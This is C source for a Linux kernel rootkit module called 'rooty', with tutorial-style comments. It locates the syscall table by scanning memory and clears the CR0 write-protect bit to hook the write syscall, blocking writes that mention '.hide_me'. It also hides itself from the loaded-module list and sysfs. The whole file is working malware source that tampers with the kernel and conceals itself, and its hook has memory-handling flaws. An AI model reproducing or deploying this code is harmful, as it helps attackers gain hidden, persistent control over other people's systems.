#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
/* This is a "driver template". It requires:
 * MODULE_LICENSE();
 * module_init();
 * module_exit();
 *
 * It will allow us to load a kernel module, we're naming it `rooty`
 */

MODULE_LICENSE("GPL");
int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);
/* Define memory ranges where we might find syscall table */
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize; // Type alias `psize` for `unsigned int` in 32bit case
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize; // Type alias `psize` for `unsigned long` in 64bit case
#endif

asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);

/* Brute force memory range to find syscall table */
psize *sys_call_table;
psize **find(void) { // find(void) returns ptr->ptr->psize
	psize **sctable; // **sctable is ptr->ptr->psize
	psize i = START_CHECK;
	while (i < END_CHECK) {
		sctable = (psize **) i;
		if (sctable[__NR_close] == (psize *) sys_close) { // Don't capitalise __NR_`close` if you don't want to spend hours debugging #facepalm
			return &sctable[0];
		}
		i += sizeof(void *);
	}
	return NULL;
}

asmlinkage ssize_t rooty_write(int fd, const char __user *buff, size_t count) {
        int r;
        char *dir_protect = ".hide_me"; /* Directory to protect */
        char *kbuff = (char *) kmalloc(256,GFP_KERNEL); /* allocate kernel buffer */
        copy_from_user(kbuff,buff,255); /* copy user buffer into kernel buffer */
        if (strstr(kbuff,dir_protect)) { /* check if buffer contains special dir name */
                kfree(kbuff); /* free the buffer if yes */
                return EEXIST; /* file exists error */
        }
        r = (*o_write)(fd,buff,count); /* else return normal data */
        kfree(kbuff);
        return r;
}

/* Load function print
 * printk() ``The kernel print function, printk(), behaves almost identically  * to the C library printf() function.``
 * Prints to kernel ring buffer
 */
int rooty_init(void) {
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);   /*Hide from list*/
	printk("rooty: module loaded\n");
	/* Find the syscall table address */
	if ((sys_call_table = (psize *) find())) {
		printk("rooty: sys_call_table found at %p\n", sys_call_table);
	} else {
		printk("rooty: sys_call_table not found\n");
	}
	/* Here we can disable CPU protected mode with some masking
	   Can check if wp mode is enabled with: "cat /proc/cpuinfo | grep wp"
	   NOT 0x10000 = 0x01111
	   AND contents of cr0 with 0x01111 flips the WP bit to 0 */
	printk("updating cr0\n");
	write_cr0(read_cr0() & (~ 0x10000));
	o_write = (void *) xchg(&sys_call_table[__NR_write],rooty_write);
	write_cr0(read_cr0() | 0x10000);

	return 0;
}

/* Exit function print */
void rooty_exit(void) {
	write_cr0(read_cr0() & (~ 0x10000));
	xchg(&sys_call_table[__NR_write],o_write);
	write_cr0(read_cr0() | 0x10000);
	printk("rooty: module removed\n");
}
